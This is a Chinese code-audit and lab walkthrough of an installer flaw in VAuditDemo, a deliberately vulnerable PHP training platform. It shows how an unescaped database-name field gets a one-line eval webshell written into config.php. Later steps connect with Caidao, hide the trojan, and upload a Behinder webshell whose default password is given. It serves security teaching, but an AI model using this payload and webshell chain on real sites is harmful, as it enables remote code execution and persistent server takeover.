[TOC]

# ==VAuditDemo安装漏洞==

第一步访问首页http://192.168.230.188:82/

![image-20240818214416624](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818214416624.png)

这个应该就是默认首页，尝试访问http://192.168.230.188:82/index.php

![image-20240818214620679](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818214620679.png)

果然，依旧是这个界面，我们进入源代码，开始审计分析

## index.php

```php
<?php 
require_once('sys/config.php');
require_once('header.php');
?>
<div class="row">
	<?php
	/* Include */
	if (isset($_GET['module'])){
		include($_GET['module'].'.inc');
	}else{
	?>
	<div class="jumbotron" style="text-align: center;">
		<h1><b>VAuditDemo</b></h1>
		<p>一个简单的Web漏洞演练平台</p><br />
	</div>
	<div class="col-lg-12">
		<h2>用於演示講解PHP基本漏洞</h2>
		<p></p>
	</div>
	<?php
	}
	?>
</div>
		
<?php
require_once('footer.php');
?>
```

首先包含了 sys/config.php 和 header.php两个文件 在下方 通过可控参数又包含了一个 `$_GET['module'].'.inc'` 文件 ，一共**存在三次文件包含**，并且第三个文件包含**存在用户可控参数 module** ，有**可能存在文件包含漏洞**

## header.php

```php
```

这个文件内容除了html标签就是SESSION变量，不存在可疑点

## config.php

```php
<?php

// error_reporting(0);
// 如果 $_SERVER["DOCUMENT_ROOT"].'/sys/install.lock' 文件不存在就跳转到安装页面
if (!file_exists($_SERVER["DOCUMENT_ROOT"].'/sys/install.lock')){
	header("Location: /install/install.php");
exit;
}

include_once('lib.php');  //config.php 和 lib.php 属于同级

$host="localhost"; 
$username="root"; 
$password="p-0p-0p-0"; 
$database="vauditdemo"; 

$conn = mysql_connect($host,$username,$password);
mysql_query('set names utf8',$conn);
mysql_select_db($database, $conn) or die(mysql_error());
if (!$conn)
{
	die('Could not connect: ' . mysql_error());
	exit;
}
session_start();
?>
```

其中又包含了 lib.php 这个文件 这里除了 $_SERVER["DOCUMENT_ROOT"] 没有其他参数是可变的了，我们再去看看包含的 lib.php

## lib.php

```php
if( !get_magic_quotes_gpc() ) {
	$_GET = sec ( $_GET );
	$_POST = sec ( $_POST );
	$_COOKIE = sec ( $_COOKIE ); 
}
$_SERVER = sec ( $_SERVER );

function sec( &$array ) {
	if ( is_array( $array ) ) {
		foreach ( $array as $k => $v ) {
			$array [$k] = sec ( $v );
		}
	} else if ( is_string( $array ) ) {
		$array = addslashes( $array );
	} else if ( is_numeric( $array ) ) {
		$array = intval( $array );
	}
	return $array;
}

function sqlwaf( $str ) {
.......
}

function clean_input( $dirty ) {
	return mysql_real_escape_string( stripslashes( $dirty ) );
}

```

其中对SQL注入做了极强的防范，同时对POST请求中的参数也做了预防

 该文件中除了 下面几句代码直接调用了，其余的都是函数，并且函数都是对输入的内容和POST传入的参数做预防，比如转义，waf等等

```php
date_default_timezone_set('UTC');

if( !get_magic_quotes_gpc() ) {
	$_GET = sec ( $_GET );
	$_POST = sec ( $_POST );
	$_COOKIE = sec ( $_COOKIE ); 
}
$_SERVER = sec ( $_SERVER );
```

除了这个函数

```php
function is_pic( $file_name ) {
	$extend =explode( "." , $file_name );
	$va=count( $extend )-1;
	if ( $extend[$va]=='jpg' || $extend[$va]=='jpeg' || $extend[$va]=='png' ) {
		return 1;
	}
	else
		return 0;
}
```

单单只是校验了文件名的后缀，我觉得**可能存在文件上传绕过的可能性**

## install.php

```php
if ( file_exists($_SERVER["DOCUMENT_ROOT"].'/sys/install.lock') ) {
	header( "Location: ../index.php" );
}
require_once '../header.php';
```

这是install.php 文件的开头 如果该文件存在，则跳转到默认首页，但是如果文件不存在呢？根据代码的分析，如果if判断中的文件不存在，那么就不会跳转页面到默认首页，然后包含 header.php 并运行下面的所有代码

```php
if (!file_exists($_SERVER["DOCUMENT_ROOT"].'/sys/install.lock')){
	header("Location: /install/install.php");
exit;
}

include_once('lib.php');  //config.php 和 lib.php 属于同级
```

这是 config.php 文件的开头 如果 该文件不存在则跳转页面进行安装

可以发现，二者的区别除了判断文件是否存在之外，config.php 文件中多了 exit; 这句代码，这句代码的问题所在是什么呢，有与没有的的区别是什么呢？

通过代码调试可以得知，如果二者判断都成立，那么 config.php 则跳转页面并结束后面的代码，但是 **install.php 就不一样了，不跳转页面，同时运行剩下的所有代码**

既然这样，继续分析 install.php 文件的剩余代码，主要寻找用户可控参数

```php
if ( $_POST ) {

	if ( $_POST["dbhost"] == "" ) {
		exit( '数据库连接地址不能为空' );
	}elseif ( $_POST["dbuser"] == "" ) {
		exit( '数据库数据库登录名' );
	}elseif ( $_POST["dbname"] == "" ) {
		exit( '请先创建数据库名称' );
	}

	$dbhost = $_POST["dbhost"];
	$dbuser = $_POST["dbuser"];
	$dbpass = $_POST["dbpass"];
	$dbname = $_POST["dbname"];

	$con = mysql_connect( $dbhost, $dbuser, $dbpass );
	if ( !$con ) {
		die( '数据库链接出错，请检查账号密码及地址是否正确: ' . mysql_error() );
	}

	$result = mysql_query('show databases;') or die ( mysql_error() );;
	While($row = mysql_fetch_assoc($result)){       
		$data[] = $row['Database'];
	}
	unset($result, $row);
	if (in_array(strtolower($dbname), $data)){
		mysql_close();
		echo "<script>if(!alert('數據庫已存在')){window.history.back(-1);}</script>";
		exit();
	}

	mysql_query( "CREATE DATABASE $dbname", $con ) or die ( mysql_error() );
```

可以发现，对于POST请求的内容，除了判断是否为空，其余的并未做任何校验，同时 **$dbname 竟然还作为 SQL 语句中的一部分，这绝对可以说是一个漏洞了**

继续向下看，最后的 footer.php 文件，和最开始的 header.php 文件一样，都是html元素标签等等，不存在可疑点

```php
$str_tmp="<?php\r\n";
$str_end="?>";
$str_tmp.="\r\n";
$str_tmp.="error_reporting(0);\r\n";
$str_tmp.="\r\n";
$str_tmp.="if (!file_exists(\$_SERVER[\"DOCUMENT_ROOT\"].'/sys/install.lock')){\r\n\theader(\"Location: /install/install.php\");\r\nexit;\r\n}\r\n";
$str_tmp.="\r\n";
$str_tmp.="include_once('../sys/lib.php');\r\n";
$str_tmp.="\r\n";
$str_tmp.="\$host=\"$dbhost\"; \r\n";
$str_tmp.="\$username=\"$dbuser\"; \r\n";
$str_tmp.="\$password=\"$dbpass\"; \r\n";
$str_tmp.="\$database=\"$dbname\"; \r\n";
$str_tmp.="\r\n";
$str_tmp.="\$conn = mysql_connect(\$host,\$username,\$password);\r\n";
$str_tmp.="mysql_query('set names utf8',\$conn);\r\n";
$str_tmp.="mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n";
$str_tmp.="if (!\$conn)\r\n";
$str_tmp.="{\r\n";
$str_tmp.="\tdie('Could not connect: ' . mysql_error());\r\n";
$str_tmp.="\texit;\r\n";
$str_tmp.="}\r\n";
$str_tmp.="\r\n";
$str_tmp.="session_start();\r\n";
$str_tmp.="\r\n";
$str_tmp.=$str_end;

$fp=fopen( "../sys/config.php", "w" );
fwrite( $fp, $str_tmp );
fclose( $fp );



<?php
require_once '../footer.php';
?>
```

**但是，我们可以看到，代码会将用户可控的参数拼接后写入 config.php 文件**

我们再看看，是将什么样的内容写进了 config.php ，原来 整个 config.php 文件的内容都是这样生成的，那么就说得通了 而且 **config.php 还是具有可写权限的，并且 config.php 中部分内容是由用户控制的** 

## 分析结果

- 用户首次访问先访问 index.php ，由于该文件包含了 config.php 和 header.php 所以，也会第一时间执行这两个文件
- 对于 config.php 文件来说，由于并不存在 install.lock 文件，所以访问的第一时间又会跳转到 install.php 
- 而在install.php 文件中，存在四个用户可控参数，并且第四个参数作为SQL语句执行，最终将执行的结果写入 config.php ，config.php 文件的内容也是由此而来

 **基于上面的分析，可以得出结论，用户在安装时，会通过 POST 提交内容，内容分别是 `$dbhost $dbuser $dbpass $dbname` 四个值，并且  `$dbhost $dbuser $dbpass` 这三个值是作为连接数据库时使用的 ，而 `$dbname` 值，作为SQL语句执行的一部分**

**所以可以得出结论，安装过程中，`$dbname` 值，存在php代码注入漏洞，与 config.php 文件相结合，有木马写入的漏洞**

## 漏洞利用

代码分析发现，一切的问题开始是判断 install.lock 文件是否存在，在 install.php 文件中 只有 install.lock 文件不存在的时候 才不会进行跳转，否则 该文件存在 ，用户一访问 install.php 给出的响应中有 `header( "Location: ../index.php" );` 浏览器解析响应后一看就会跳转，即使后面代码可以执行，前端也是无法显示后面的代码的，自然也就无法利用了。有些人可能会想，那前端页面无法访问，可以抓包啊，事实上一旦 浏览器解析到 Location 就直接跳转了，哪还来的 install.php 页面，哪来的 POST 提交正文

![image-20240818224119750](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818224119750.png)

![image-20240818224134802](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818224134802.png)

### 第一步：删除install.lock文件，访问 install.php 抓包

先访问到这个页面

![image-20240818224526073](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818224526073.png)

然后点击安装，同时开启抓包

![image-20240818224619974](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818224619974.png)

### 第二步：通过审计构造payload

install.php

```php
if ( $_POST ) {

	if ( $_POST["dbhost"] == "" ) {
		exit( '数据库连接地址不能为空' );
	}elseif ( $_POST["dbuser"] == "" ) {
		exit( '数据库数据库登录名' );
	}elseif ( $_POST["dbname"] == "" ) {
		exit( '请先创建数据库名称' );
	}

	$dbhost = $_POST["dbhost"];
	$dbuser = $_POST["dbuser"];
	$dbpass = $_POST["dbpass"];
	$dbname = $_POST["dbname"];

	$con = mysql_connect( $dbhost, $dbuser, $dbpass );
	if ( !$con ) {
		die( '数据库链接出错，请检查账号密码及地址是否正确: ' . mysql_error() );
	}

	$result = mysql_query('show databases;') or die ( mysql_error() );;
	While($row = mysql_fetch_assoc($result)){       
		$data[] = $row['Database'];
	}
	unset($result, $row);
	if (in_array(strtolower($dbname), $data)){
		mysql_close();
		echo "<script>if(!alert('數據庫已存在')){window.history.back(-1);}</script>";
		exit();
	}

	mysql_query( "CREATE DATABASE $dbname", $con ) or die ( mysql_error() );
```

config.php

```php
$database="$dbname"; 
```

那么就存在两点

- `CREATE DATABASE $dbname` 这句话必须执行成功，不能报错，报错就die
- `$database="$dbname"; ` 这句话也不能报错，需要满足php语法

```
"CREATE DATABASE $dbname" -> $database="$dbname";
"CREATE DATABASE vauditdemo2" -> $database="vauditdemo2";
"CREATE DATABASE vauditdemo2-- ";" -> $database="vauditdemo2-- ";";
"CREATE DATABASE vauditdemo2-- ";@eval($_POST[a]);//" -> $database="vauditdemo2-- ";@eval($_POST[a]);//";
```

还是不放心，用navicat测试一下 `CREATE DATABASE vauditdemo2-- ";@eval($_POST[a]);` 

![image-20240818231359886](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818231359886.png)

SQL语句执行成功，创建数据库vauditdemo2。再分析一下 `$database="vauditdemo2-- ";@eval($_POST[a]);//";` 这句代码是否存在php语法错误（双引号都闭合，分号完全，多余部分已被注释），成了！

> 至于 `$_POST[a]` 中的 a 为什么没有再加单引号和双引号，是因为怕被过滤或者报错啥的，当然，不加引号也是可以正常执行的。

### 第三步：修改抓包请求内容，写入payload

![image-20240818232033915](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818232033915.png)

发送之后，查看响应，没有报错，去访问系统

![image-20240818232141899](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818232141899.png)

查看index.php包含config.php，查看config.php发现

![image-20240818232228137](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818232228137.png)

然后访问系统，并POST提交参数a，成功。

> 注意参数a传递时，由于 eval() 函数是直接执行代码，而php的代码必须要有 ; ，所以传参时也需要带分号。

![image-20240818232447027](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818232447027.png)

### 第四步：菜刀链接

![image-20240818232710098](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818232710098.png)

链接成功，隐藏木马，并修改数据库名称为原来的。

![image-20240818232930823](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818232930823.png)

![image-20240818232910219](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818232910219.png)

重新隐藏木马，并重新建立连接

![image-20240818233309004](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818233309004.png)

![image-20240818233329726](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818233329726.png)

上传冰蝎马，并使用冰蝎链接（冰蝎马默认链接密码是rebeyond）

![image-20240818233653569](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818233653569.png)

![image-20240818233631891](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240818233631891.png)

